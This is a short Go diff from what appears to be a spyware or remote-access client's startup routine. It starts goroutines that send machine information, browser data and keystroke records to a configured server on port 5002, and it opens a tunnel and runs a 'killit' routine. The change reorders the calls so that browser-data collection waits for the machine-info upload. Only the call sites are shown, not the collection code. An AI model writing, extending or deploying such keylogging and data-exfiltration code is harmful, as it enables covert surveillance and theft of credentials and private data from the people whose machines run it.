@@ -58,9 +58,11 @@ func onReady() {
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
 	go transfer.PacHandle(Config.PacPort)
-	go machineinfo.MachineSend("http://" + conf.Url + ":5002/machine/machineInfo")
+	finflag := make(chan string)
+	go machineinfo.MachineSend("http://"+conf.Url+":5002/machine/machineInfo", finflag)
+	<-finflag
+	go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
 	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
-	go browser.Digpack("http://" + conf.Url + ":5002/browser/")
 	go tunnel.Tunnel(conf.Url)
 	go killit.Killit()
 	////check update
